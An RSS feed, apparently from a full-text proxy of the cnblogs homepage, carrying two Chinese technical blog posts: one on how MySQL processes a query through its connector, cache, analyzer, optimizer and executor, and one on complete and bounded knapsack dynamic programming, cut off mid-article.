<?xml version="1.0" encoding="utf-8"?>
<?xml-stylesheet type="text/xsl" href="css/feed.xsl"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:media="http://search.yahoo.com/mrss/" xmlns:og="http://ogp.me/ns#">
<channel>
<atom:link rel="self" href="http://192.168.1.4/fivefilters/makefulltextfeed.php?url=feed.cnblogs.com%2Fblog%2Fsitehome%2Frss&amp;max=10&amp;links=preserve&amp;exc=" />
<atom:link rel="alternate" title="Source URL" href="http://feed.cnblogs.com/blog/sitehome/rss" />
<atom:link rel="related" title="Subscribe to feed" href="http://www.subtome.com/#/subscribe?feeds=http%3A%2F%2F192.168.1.4%2Ffivefilters%2Fmakefulltextfeed.php%3Furl%3Dfeed.cnblogs.com%252Fblog%252Fsitehome%252Frss%26max%3D10%26links%3Dpreserve%26exc%3D&amp;back=http%3A%2F%2F192.168.1.4%2Ffivefilters%2Fmakefulltextfeed.php%3Furl%3Dfeed.cnblogs.com%252Fblog%252Fsitehome%252Frss%26max%3D10%26links%3Dpreserve%26exc%3D" />
<title>博客园_首页</title>
<link></link>
<description>代码改变世界</description>
<item>
<title>当程序执行一条查询语句时，MySQL内部到底发生了什么？ （说一下 MySQL 执行一条查询语句的内部执行过程？ - 秋天的风，夏天的雨</title>
<link>http://www.cnblogs.com/beyond-succeed/p/12572082.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/beyond-succeed/p/12572082.html</guid>
<description>&lt;h2&gt;&lt;strong&gt;先来个最基本的总结阐述，希望各位小伙伴认真的读一下，哈哈：&lt;/strong&gt;&lt;/h2&gt;
&lt;p&gt;1）客户端（运行程序）先通过&lt;span&gt;&lt;strong&gt;连接器&lt;/strong&gt;&lt;/span&gt;连接到MySql服务器。&lt;/p&gt;
&lt;p&gt;2）连接器通过数据库权限身份验证后，会先查询数据库缓存是否存在（之前执行过相同条件的SQL查询），如果有会直接返回缓存中的数据。如果没有则会进入分析器。&lt;/p&gt;
&lt;p&gt;3）进入&lt;strong&gt;&lt;span&gt;分析器&lt;/span&gt;&lt;/strong&gt;后会对查询语句进行词法语法的分析，判断该查询语句SQL是否存在语法错误，如果存在查询语法词法错误，会直接返回给客户端错误，如果正确则会进入优化器。&lt;/p&gt;
&lt;p&gt;4）&lt;strong&gt;&lt;span&gt;优化器&lt;/span&gt;&lt;/strong&gt;会对查询语句进行优化处理：例如：如果一条语句用到了多个索引会判断哪个索引性能更好。&lt;/p&gt;
&lt;p&gt;5）最终会进入&lt;strong&gt;&lt;span&gt;执行器&lt;/span&gt;&lt;/strong&gt;，开始执行查询语句直到查询出满足条件的所有数据，然后进行返回。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;span&gt;下面我们详细的来说一&lt;/span&gt;下：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;假如说我们有一张 User 表 ，表里只有一个字段 &lt;code&gt;ID&lt;/code&gt;，当我们执行下边这条SQL语句时：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;
&lt;pre&gt;
&lt;span&gt;mysql&lt;/span&gt;&amp;gt; select * fron T where ID = 10；
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;在我们眼中能看到的只是输入一条 SQL语句，返回一条查询结果，却不曾知道这条SQL在MySQL的内部经历了什么，下面我们来一步一步的分析一下；如下是MySQL的基本架构图，从图中可以清楚的看到SQL在MySQL中各个功能模块执行的过程：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img.jacian.com/FpRxarDoFQ0vsGUirl1dfDoTKC3B&quot; alt=&quot;一条SQL查询语句执行过程&quot; width=&quot;534&quot; height=&quot;505&quot;/&gt;&lt;/p&gt;

&lt;p&gt;大体来说，MySQL可以分为&lt;strong&gt;&lt;span&gt;Server层&lt;/span&gt;&lt;/strong&gt;和&lt;span&gt;&lt;strong&gt;存储引擎&lt;/strong&gt;&lt;/span&gt;两部分。&lt;/p&gt;
&lt;p&gt;&lt;br/&gt;Server层：包括连接器、分析器、查询缓存、优化器、执行器等。&lt;/p&gt;
&lt;p&gt;&lt;br/&gt;存储引擎：负责数据的存储和提取。其架构模式是插件式的，支持InnoDB、MyISAM、Memory等多种存储模式。现如今最常用的存储引擎是InnoDB，它从&lt;strong&gt;&lt;span&gt;&lt;code&gt;MySQL5.5.5&lt;/code&gt;&lt;/span&gt;&lt;/strong&gt;开始成为了默认存储引擎。也就是说当我们不指定存储引擎时默认使用的就是&lt;code&gt;InnoDB&lt;/code&gt;，我们也可以在 &lt;code&gt;create table&lt;/code&gt;时通过&lt;code&gt;engine=memory&lt;/code&gt; 来指定存储引擎。&lt;/p&gt;

&lt;p&gt;从图中可以看出：不同的存储引擎共用同一个 &lt;code&gt;server层&lt;/code&gt;，也就是连接器到执行器那一部分。&lt;/p&gt;

&lt;p&gt;现在我们跟着开篇提到的那条&lt;code&gt;SQL&lt;/code&gt;进入&lt;code&gt;MySQL&lt;/code&gt;内部到底是怎么执行的，&lt;code&gt;Let's go&lt;/code&gt;:&lt;/p&gt;

&lt;h2 id=&quot;连接器&quot;&gt;连接器：&lt;/h2&gt;
&lt;p&gt;首先，我们需要连接上数据库，这时候接待我们的就是连接器，连接器主要负责的工作就是跟客户端建立连接、获取权限、维持和管理连接。连接命令如下：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;
&lt;pre&gt;
-- &lt;span&gt;$ip&lt;/span&gt;:&lt;span&gt; 服务器IP
&lt;/span&gt;-- &lt;span&gt;$port&lt;/span&gt;:&lt;span&gt; MySQL端口号
&lt;/span&gt;-- &lt;span&gt;$user&lt;/span&gt;:&lt;span&gt; 用户名
&lt;/span&gt;&lt;span&gt;mysql&lt;/span&gt; -h&lt;span&gt;$ip&lt;/span&gt; -P&lt;span&gt;$port&lt;/span&gt; -u&lt;span&gt;$user&lt;/span&gt; -p
&lt;/pre&gt;&lt;/div&gt;
&lt;ul&gt;&lt;li&gt;如果用户名或密码不对，则会收到一个&lt;code&gt;“Access denied for user”&lt;/code&gt;错误，然后客户端程序结束执行。&lt;/li&gt;
&lt;li&gt;如果用户名密码认证通过，连接器则会去权限表中查询该用户所拥有的权限，这个链接里边的权限逻辑判断，全都依赖于此时读到的权限。&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;这就意味着，当一个用户成功建立连接后，即使使用管理员账户对其权限做了修改，也不会立即生效，只有重新建立链接后才会使用新的权限设置。&lt;/p&gt;

&lt;h2 id=&quot;查询缓存&quot;&gt;查询缓存：&lt;/h2&gt;
&lt;p&gt;连接建立成功后，我们就可以执行SQL语句了，这时候会先来查询缓存：&lt;/p&gt;
&lt;p&gt;&lt;code&gt;MySQL&lt;/code&gt;拿到一个&lt;code&gt;SQL语句&lt;/code&gt;之后会先到缓存看看是否在此之前执行过这条语句，之前执行的语句可能会以 &lt;strong&gt;&lt;span&gt;&lt;code&gt;key-value&lt;/code&gt; &lt;/span&gt;&lt;/strong&gt;的形式直接缓存在内存中。&lt;code&gt;key&lt;/code&gt;是查询语句，&lt;code&gt;value&lt;/code&gt;是查询结果。如果你的查询能在缓存中找到相应的&lt;code&gt;key&lt;/code&gt;，则直接返回其对应的&lt;code&gt;value&lt;/code&gt; 给客户端。&lt;/p&gt;
&lt;p&gt;如果语句不在查询缓存中，就会继续后面的执行阶段。执行完成后，执行结果会被存入查询缓存中。你可以看到，如果查询命中缓存，&lt;code&gt;MySQL&lt;/code&gt;不需要执行后面的复杂操作，就可以直接返回结果，这个效率会很高。&lt;/p&gt;

&lt;h2 id=&quot;分析器&quot;&gt;分析器：&lt;/h2&gt;
&lt;p&gt;如果没有命中缓存的话，则真正开始执行语句了；首先&lt;code&gt;MySQL&lt;/code&gt;要知道我们要做什么，所以要先对&lt;code&gt;SQL&lt;/code&gt;进行解析。&lt;/p&gt;
&lt;p&gt;分析器首先进行词法分析。我们输入的&lt;code&gt;SQL&lt;/code&gt;是由多个字符串组成的，&lt;code&gt;MySQL&lt;/code&gt;需要识别出来里边的字符串分别是什么，代表什么意思。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;MySQL&lt;/code&gt;从我们输入的&lt;code&gt;select&lt;/code&gt;识别出来这是一个查询语句，它还需要把字符串&lt;code&gt;T&lt;/code&gt;识别成&lt;code&gt;表名User&lt;/code&gt;，把&lt;code&gt;ID&lt;/code&gt;识别成&lt;code&gt;列ID&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;词法分析结束之后，需要对&lt;code&gt;SQL&lt;/code&gt;进行语法分析。根据词法分析的结果，语法分析器会根据语法规则来判断我们输入的这条&lt;code&gt;SQL&lt;/code&gt;是否满足&lt;code&gt;MySQL&lt;/code&gt;的语法规则。&lt;br/&gt;如果我们的语法不对的话，我们会受到&lt;code&gt;MySQL&lt;/code&gt;的错误提示&lt;code&gt;You have an error in your SQL syntax&lt;/code&gt;，比如这条&lt;code&gt;SQL&lt;/code&gt;中的&lt;code&gt;select&lt;/code&gt;少了个&lt;code&gt;s&lt;/code&gt;：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;34&quot;&gt;
&lt;pre&gt;
&lt;span&gt;mysql&lt;/span&gt;&amp;gt; elect * from user where id = 1&lt;span&gt;;

ERROR &lt;/span&gt;1064 (42000): You have an error in your SQL syntax; check the manual that corresponds to your &lt;span&gt;MySQL&lt;/span&gt; server version &lt;span&gt;for&lt;/span&gt; the right syntax to &lt;span&gt;use&lt;/span&gt; near 'elect * from t where ID=1' at line 1
&lt;/pre&gt;&lt;/div&gt;

&lt;h2 id=&quot;优化器&quot;&gt;优化器&lt;/h2&gt;
&lt;p&gt;经过了&lt;code&gt;分析器&lt;/code&gt;，&lt;code&gt;MySQL&lt;/code&gt;知道我们要做什么了，在它开始执行之前，还要先经过优化器的处理。&lt;/p&gt;
&lt;p&gt;优化器是在表里面有多个索引的时候，决定使用哪个索引；或者在一个语句有多表关联（join）的时候，决定各个表的连接顺序。比如下边这条语句，这个语句时执行两个表的&lt;code&gt;join&lt;/code&gt;：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;
&lt;pre&gt;
&lt;span&gt;mysql&lt;/span&gt;&amp;gt; select * from t1 &lt;span&gt;join&lt;/span&gt; t2 using(ID)  where t1.c=10 and t2.d=20;
&lt;/pre&gt;&lt;/div&gt;
&lt;ul&gt;&lt;li&gt;既可以先从表&lt;code&gt;t1&lt;/code&gt;里面取出&lt;code&gt;c=10&lt;/code&gt;的ID值，再根据ID值去关联到表&lt;code&gt;t2&lt;/code&gt;，在判断&lt;code&gt;t2&lt;/code&gt;里面的d的值是否等于&lt;code&gt;20&lt;/code&gt;；&lt;/li&gt;
&lt;li&gt;也可以先从表&lt;code&gt;t2&lt;/code&gt;里面取出&lt;code&gt;d=20&lt;/code&gt;的记录的ID值，再根据ID值关联到&lt;code&gt;t1&lt;/code&gt;，再判断&lt;code&gt;t1&lt;/code&gt;里面的c的值是否等于&lt;code&gt;10&lt;/code&gt;；&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;这两种执行方式的逻辑和结果都是一样的，但是执行效率会有所不同，优化器的作用就是决定选择哪种方案。&lt;/p&gt;

&lt;h2 id=&quot;执行器&quot;&gt;执行器&lt;/h2&gt;
&lt;p&gt;&lt;code&gt;MySQL&lt;/code&gt;通过分析器知道了我们要做什么，通过优化器知道了应该怎么做，于是就进入执行器阶段，开始真正的执行语句。&lt;/p&gt;
&lt;p&gt;开始执行的时候，首先要确认我们是否有操作这个表（T）的权限，如果没有权限则会返回没有权限的错误:&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;33&quot;&gt;
&lt;pre&gt;
&lt;span&gt;mysql&lt;/span&gt;&amp;gt; select * from T where ID=10&lt;span&gt;;

ERROR &lt;/span&gt;1142 (42000): SELECT command denied to user 'b'@'localhost' &lt;span&gt;for&lt;/span&gt; table 'T'
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;如果有权限，就打开表继续执行，打开表的时候执行器会根据表的引擎定义，去使用这个额引擎提供的接口。&lt;/p&gt;
&lt;p&gt;比如在这个例子中的&lt;code&gt;表T&lt;/code&gt;中的&lt;code&gt;ID&lt;/code&gt;字段是没有索引的，那么执行器的流程是这样的：&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;调用&lt;code&gt;InnoDB&lt;/code&gt;引擎接口取这个表的第一行，判断&lt;code&gt;ID&lt;/code&gt;是否为&lt;code&gt;10&lt;/code&gt;，如果不是则跳过，如果是则将这行存在结果集中。&lt;/li&gt;
&lt;li&gt;调用引擎接口取&lt;code&gt;下一行&lt;/code&gt;，重复相同的逻辑判断，直到取到这个表的最后一行。&lt;/li&gt;
&lt;li&gt;执行器将上述遍历过程的所有满足条件的行组成的记录集作为结果集返回给客户端。&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;至此，这个语句就执行完成了。&lt;/p&gt;
&lt;p&gt;对于有索引的表，执行的逻辑也差不多。第一次调用的是“取满足条件的第一行”这个接口，之后循环取“满足条件的下一行”这个接口，这些接口都是引擎中已经定义好的。你会在数据库的慢查询日志中看到一个 rows_examined 的字段，表示这个语句执行过程中扫描了多少行。这个值就是在执行器每次调用引擎获取数据行的时候累加的。&lt;/p&gt;
&lt;p&gt;在有些场景下，执行器调用一次，在引擎内部则扫描了多行，因此引擎扫描行数跟 rows_examined 并不是完全相同的。&lt;/p&gt;

&lt;h4&gt;&lt;strong&gt;延伸出的面试题问法，各种变态考察：&lt;/strong&gt;&lt;/h4&gt;

&lt;h3 id=&quot;mysql-1&quot; class=&quot;1&quot;&gt;1）MySQL 提示“不存在此列”是执行到哪个节点报出的？&lt;/h3&gt;
&lt;p&gt;此错误是执行到分析器阶段报出的，因为 MySQL 会在分析器阶段检查 SQL 语句的正确性。&lt;/p&gt;

&lt;h3 id=&quot;mysql-2&quot; class=&quot;2&quot;&gt;2）MySQL 查询缓存的功能有何优缺点？&lt;/h3&gt;
&lt;p&gt;MySQL 查询缓存功能是在连接器之后发生的，它的优点是效率高，如果已经有缓存则会直接返回结果。 查询缓存的缺点是失效太频繁导致缓存命中率比较低，任何更新表操作都会清空查询缓存，因此导致查询缓存非常容易失效。&lt;/p&gt;

&lt;h3 id=&quot;mysql-3&quot; class=&quot;3&quot;&gt;3）如何关闭 MySQL 的查询缓存功能？&lt;/h3&gt;
&lt;p&gt;MySQL 查询缓存默认是开启的，配置 query&lt;em&gt;cache&lt;/em&gt;type 参数为 DEMAND（按需使用）关闭查询缓存，MySQL 8.0 之后直接删除了查询缓存的功能。&lt;/p&gt;
</description>
<pubDate>Thu, 26 Mar 2020 00:36:00 +0000</pubDate>
<dc:creator>秋天的风，夏天的雨</dc:creator>
<og:description>先来个最基本的总结阐述，希望各位小伙伴认真的读一下，哈哈： 1）客户端（运行程序）先通过连接器连接到MySql服务器。 2）连接器通过数据库权限身份验证后，会先查询数据库缓存是否存在（之前执行过相同条</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.cnblogs.com/beyond-succeed/p/12572082.html</dc:identifier>
</item>
<item>
<title>动态规划入门——详解完全背包与多重背包问题 - TechFlow2019</title>
<link>http://www.cnblogs.com/techflow/p/12572079.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/techflow/p/12572079.html</guid>
<description>&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;今天是&lt;strong&gt;算法数据结构专题的第13篇&lt;/strong&gt;文章，也是动态规划专题的第二篇。&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;上一讲当中我们一起学习了动态规划算法中的零一背包问题，我们知道了所谓的零一背包是指每一种物品只有一个，所以它的状态只有0和1两种，即拿或者不拿。而今天我们要来讨论物品不止有一个的情况，物品不止有一个也分两种，一种是不作任何限制，要多少有多少，这种称为完全背包问题，另一种是依然有个数限制，这种称为多重背包问题。&lt;/p&gt;
&lt;img src=&quot;https://user-gold-cdn.xitu.io/2020/3/26/1711440e67490551?w=1200&amp;amp;h=1040&amp;amp;f=png&amp;amp;s=633847&quot; alt=&quot;&quot;/&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;我们一个一个来看，我们先从其中比较简单的完全背包开始。由于我们这是一个连续的专题，没有看过上篇文章或者是新关注的同学可以移步我们专题的第一篇：&lt;/p&gt;
&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;&lt;a href=&quot;https://mp.weixin.qq.com/s?__biz=MzUyMTM5OTM2NA==&amp;amp;mid=2247484886&amp;amp;idx=1&amp;amp;sn=8460834d53d467cae60cd31c48c480bb&amp;amp;chksm=f9daf8fdcead71eb258215aabf61ca82d493e3a27318b17365199c9952bc0ac7124ba9808c9b&amp;amp;token=1213336307&amp;amp;lang=zh_CN#rd&quot;&gt;动态规划入门——详解经典的零一背包问题&lt;/a&gt;&lt;/p&gt;
&lt;h2 data-tool=&quot;mdnice编辑器&quot;&gt;&lt;span class=&quot;content&quot;&gt;完全背包&lt;/span&gt;&lt;/h2&gt;
&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;在之前的文章当中，我们阐述了动态规划当中&lt;strong&gt;状态和决策以及状态转移&lt;/strong&gt;的相关概念。在背包问题当中，背包的容量是状态，而选择哪个物品进行获取则是决策，当我们制定了一个决策之后，背包会从一个状态转移到另一个状态。而动态规划算法就是枚举所有状态和决策，获得所有的状态转移，并且&lt;strong&gt;记录这个过程中每个状态能够获得的最优解&lt;/strong&gt;。&lt;/p&gt;
&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;在之前的文章当中，我们先遍历了所有的决策，然后再枚举了所有的状态，计算在决策下进行转移之后得到的结果。在之前的零一背包问题当中，由于我们每个物品只能获取一个，如果在前面的状态执行了决策，那么后面的状态则不能进行相同的决策。这也就是动态规划的&lt;strong&gt;后效性&lt;/strong&gt;，而在完全背包问题当中，我们去掉了这个限制，也就意味着决策之间不再有后效性，一个决策可以重复应用在各个状态当中。&lt;/p&gt;
&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;所以如果你能理解上面这段话，那么整个算法其实非常简单，几乎就是零一背包的代码。只不过我们把其中倒叙遍历的背包状态再”修正“回来。&lt;/p&gt;
&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;之前我们为了避免物品的重复获取，所以采用了倒叙遍历的方法，如今我们不再对数量进行限制，意味着我们可以自由地采取决策进行转移。要做到这点，就是单纯的两重循环，第一种枚举决策， 第二重枚举状态，记录所有转移可能带来的最优解即可。我们来看代码：&lt;/p&gt;
&lt;pre class=&quot;custom&quot; data-tool=&quot;mdnice编辑器&quot; readability=&quot;9&quot;&gt;
&lt;code class=&quot;hljs&quot; readability=&quot;12&quot;&gt;dp = [&lt;span class=&quot;hljs-number&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;hljs-keyword&quot;&gt;for&lt;/span&gt; _ &lt;span class=&quot;hljs-keyword&quot;&gt;in&lt;/span&gt; range(&lt;span class=&quot;hljs-number&quot;&gt;11&lt;/span&gt;)]&lt;p&gt;items = [[&lt;span class=&quot;hljs-number&quot;&gt;6&lt;/span&gt;, &lt;span class=&quot;hljs-number&quot;&gt;10&lt;/span&gt;], [&lt;span class=&quot;hljs-number&quot;&gt;5&lt;/span&gt;, &lt;span class=&quot;hljs-number&quot;&gt;8&lt;/span&gt;], [&lt;span class=&quot;hljs-number&quot;&gt;5&lt;/span&gt;, &lt;span class=&quot;hljs-number&quot;&gt;9&lt;/span&gt;]]&lt;/p&gt;&lt;p&gt;&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;for&lt;/span&gt; v, w &lt;span class=&quot;hljs-keyword&quot;&gt;in&lt;/span&gt; items:&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;for&lt;/span&gt; vp &lt;span class=&quot;hljs-keyword&quot;&gt;in&lt;/span&gt; range(&lt;span class=&quot;hljs-number&quot;&gt;0&lt;/span&gt;, &lt;span class=&quot;hljs-number&quot;&gt;10&lt;/span&gt;-v+&lt;span class=&quot;hljs-number&quot;&gt;1&lt;/span&gt;):&lt;br/&gt;dp[vp+v] = max(dp[vp+v], dp[vp] + w)&lt;/p&gt;&lt;p&gt;print(max(dp]))&lt;br/&gt;&lt;/p&gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;如果你还没能完全理解其中的逻辑，我们可以对照一下代码再来理解一下。在第一种循环当中，我们遍历了所有的物品，每一个物品对应了一种决策。每一个决策可以应用在各个状态上，比如第一个物品是6， 15，代表它的体积是6，价值是15。那么我们遍历所有能够应用这个决策的状态，也就是在&lt;strong&gt;不超过背包容量&lt;/strong&gt;的情况下能够放下的状态。显然对于一个体积是6的物品来说，只有0到4的状态可以放下。比如说我们选择状态2，状态2放下了这个物品之后，自然会转移到状态8，因为体积增加了6。有可能这个决策会使得状态8获得更好的结果，也有可能不会，如果会的话我们就更新一下状态8记录的值。这个从一个状态采取决策到另一个状态的过程就是状态转移。&lt;/p&gt;
&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;完全背包就是&lt;strong&gt;零一背包的无限制版&lt;/strong&gt;，从原理上来说，两者的思路和做法基本上是一样的。如果你能理解零一背包，那么完全背包对你来说也一定不在话下。&lt;/p&gt;
&lt;h3 data-tool=&quot;mdnice编辑器&quot;&gt;&lt;span class=&quot;content&quot;&gt;细小的优化&lt;/span&gt;&lt;/h3&gt;
&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;在完全背包当中，由于所有的物品都可以无限获取。所以我们可以引入一些零一背包不能进行的优化，比如&lt;strong&gt;对于同样体积的物品而言，我们可以只保留价值最高的物品&lt;/strong&gt;，将其他的物品过滤掉。这个思路很朴素，我想大家应该都能理解。&lt;/p&gt;
&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;比如两个物品体积都是3，一个价值是4，另一个价值是3，我们完全可以忽略价值是3的那一种。因为两者带来的状态转移是一样的，但是明显前者收益更好。而这个优化在零一背包当中不可行是因为每个物品只有一个，&lt;strong&gt;很有可能会出现两者都要的情况&lt;/strong&gt;，所以不能简单地替换。而在完全背包当中则没有这个问题。&lt;/p&gt;
&lt;h2 data-tool=&quot;mdnice编辑器&quot;&gt;&lt;span class=&quot;content&quot;&gt;多重背包&lt;/span&gt;&lt;/h2&gt;
&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;和零一背包以及完全背包相比，多重背包要难上一些，它的解法也非常多样。我们今天先来看一些相对比较简单的方法。&lt;/p&gt;
&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;同样，我们从最简单的方法开始讲起。最简单的方法当然就是&lt;strong&gt;将多重背包蜕化成零一背包&lt;/strong&gt;来解决，比如一个物品最多可以拿N个，我们就把它拆成N种物品，这N种每种物品最多拿一个，相当于我们一种物品可以最多拿N个。这个思路应该很简单，大家都能想明白，但是有个很大的问题，就是复杂度。当然我们可以根据背包的体积做一些优化，比如当物品的数量很多并且超过了背包容量的时候，我们可以把超过容量的数量去掉，但是&lt;strong&gt;整体的复杂度还是很高。尤其是当我们背包容量很大的时候&lt;/strong&gt;。&lt;/p&gt;
&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;那么，我们怎么来解决这个问题呢？&lt;/p&gt;
&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;这里要介绍一个比较通用的算法，这个算法可以用来优化很多问题，也是很多算法的思想。它就是&lt;strong&gt;二进制表示法&lt;/strong&gt;。这个方法我们在之前的文章当中曾经讲到过，思想非常简单，但是非常实用。&lt;/p&gt;
&lt;h3 data-tool=&quot;mdnice编辑器&quot;&gt;&lt;span class=&quot;content&quot;&gt;二进制表示法&lt;/span&gt;&lt;/h3&gt;
&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;所谓二进制表示法就是将一个int类型的数表示成二进制，整个算法的思想就是这一句话，所以我想大家应该都能理解。但是我们为什么要将一个int转成二进制，以及转成二进制之后怎么样来优化算法，这个才是我们想知道的，也才是算法的核心重点，不要着急，我们一点点来说明。&lt;/p&gt;
&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;我们都知道在计算机系统当中都是以二进制存储的所有数据，最典型的就是整数。一个32位的int，可以表示最大21亿的整数。这个都是我们已知的，但是换一个角度来看，一个21亿的数最后用32个二进制位就表示了，其实非常惊人。为什么说二进制是一个非常伟大的思想？不在于它难，而在于它高效地压缩了数据。&lt;/p&gt;
&lt;img src=&quot;https://user-gold-cdn.xitu.io/2020/3/26/1711440ebb0bbde6?w=984&amp;amp;h=510&amp;amp;f=png&amp;amp;s=41616&quot; alt=&quot;&quot;/&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;我们进一步来看，32个二进制位为什么能表示这么大的数据呢？因为这32位int表示的数据是不一样的，第0位表示1，第1位表示2，第2位表示4……到了第31位的时候，表示的数已经非常庞大。我们用这32个数不同的组合来表示不同的数，换句话说范围内的所有数最终都变成了这32个数中若干个的累加。我们写成公式就是：，这里的表示的是第i位的系数，它只有0和1两个取值。&lt;/p&gt;
&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;这个式子大家都熟悉，但是我们把它应用在方程当中可能很多人就不清楚了。比如说某个函数如果满足这样的性质:，如果直接求很麻烦，或者是开销很大，我们就可以用和来获得。同理，我们用在二进制上，我们可以得到：&lt;/p&gt;
&lt;section class=&quot;block-equation&quot; role=&quot;presentation&quot; data-formula=&quot;f(x) = \sum_{i=0}^{31} a_i \cdot f(2^i)&quot; data-formula-type=&quot;block-equation&quot;/&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;看到了吗，我们把的值转化成了最多32个值的和，在有些场景当中是很容易计算的，但是很难直接计算，这个时候我们通过二进制转化就会很简单。&lt;/p&gt;
&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;同理，累加理解了，累乘也就水到渠成。如果某个函数满足:，那么我们同样可以用二进制来表达：&lt;/p&gt;
&lt;section class=&quot;block-equation&quot; role=&quot;presentation&quot; data-formula=&quot;f(x) = \prod_{i=0}^{31} g(i)&quot; data-formula-type=&quot;block-equation&quot;/&gt;&lt;section class=&quot;block-equation&quot; role=&quot;presentation&quot; data-formula=&quot;g(i) = \begin{cases} 1, &amp;amp; a_i == 0\ f(2^i), &amp;amp; a_i == 1 \end{cases}&quot; data-formula-type=&quot;block-equation&quot;/&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;对于多重背包这个问题，显然我们&lt;strong&gt;满足的是累加性质&lt;/strong&gt;。也就是说，对于一个较大的x而言，我们可以用若干个子状态累加得到。由于，所以我们很容易发现，，也就是说这些子状态之间彼此存在倍数关系。因此我们可以很轻松地计算出这些子状态，再根据x的二进制表示来累加求到，而直接计算则困难得多，计算量也大得多。&lt;/p&gt;
&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;在这个问题当中，函数f表示的是我们拿取物品的价值。也就是说，某一种物品，假设最多有n个，并且单个的价值是p，那么我们拿取2个就是2p，拿取4个就是4p，对于所有2的幂个数的价值都很容易计算。我们需要枚举这n个物品拿取的情况，我们枚举的范围应该是[0, n]。我们将n转化成二进制之后，可以通过logn个2的幂排列组合的和得到[0, n]当中的任意一个数。那么，我们&lt;strong&gt;只需要将2的幂个数的物品看成是新的物品&lt;/strong&gt;，这样，我们可以用新的物品的01组合，来代替原物品拿取0-n的所有情况。&lt;/p&gt;
&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;举个例子，我们有一个物品一共有15个，价值是3，其中15=，也就是说我们用4个二进制位就可以表示1-15这15这数字。那么我们用4种物品映射这4个二进制位之后，就可以用这4种物品的组合来表示获取1-15个原物品了。也就是说我们把15个价值是3的物品打了四个包，第一个包里有一个，第二个包里有两个，第三个包里有四个，第四个包里有八个。如果我们要拿3个原物品，相当于拿第一和第二个包裹。如果我们要拿5个原物品，相当于拿第一个和第三个包裹。&lt;strong&gt;这样我们就把多重背包的问题转化回了零一背包&lt;/strong&gt;。&lt;/p&gt;
&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;我们之前说了，32位二进制位就可以表示20亿以上的数，所以虽然我们进行二进制处理之后物品的数量会增多一些，但也是非常有限的。我们做个简单的复杂度分析，假设物品的总数是N，每种物品最多M个，背包的容量是V。如果用朴素的拆分方法，复杂度是，而使用二进制拆分的复杂度是。和前者相比，从M到logM是一个巨大的优化，尤其当M很大的时候。&lt;/p&gt;
&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;最后，还有一个小问题，&lt;strong&gt;我们的物品数量并不一定刚好能分成若干个2的幂的和&lt;/strong&gt;，这种情况下怎么办呢？其实也简单，我们把分剩下的部分单独打一个包就好了。比如如果物品的数量是10，10=1+2+4+3，所以最后一个包就是3。虽然我们用1+2也能表示3，但是这并不会影响结果的正确性。&lt;/p&gt;
&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;到这里，多重背包的解法就介绍完了，说了这么多其实也只是介绍了二进制表示这个方法而已。理解了这个方法，它就转化成了零一背包。不得不说这个方法实在是非常巧妙，并且除了在背包问题之外，在许多其他问题中也有类似的运用。所以这个方法不建议错过。&lt;/p&gt;
&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;最后，我们来看下代码，首先我们来看下二进制拆分的部分：&lt;/p&gt;
&lt;pre class=&quot;custom&quot; data-tool=&quot;mdnice编辑器&quot;&gt;
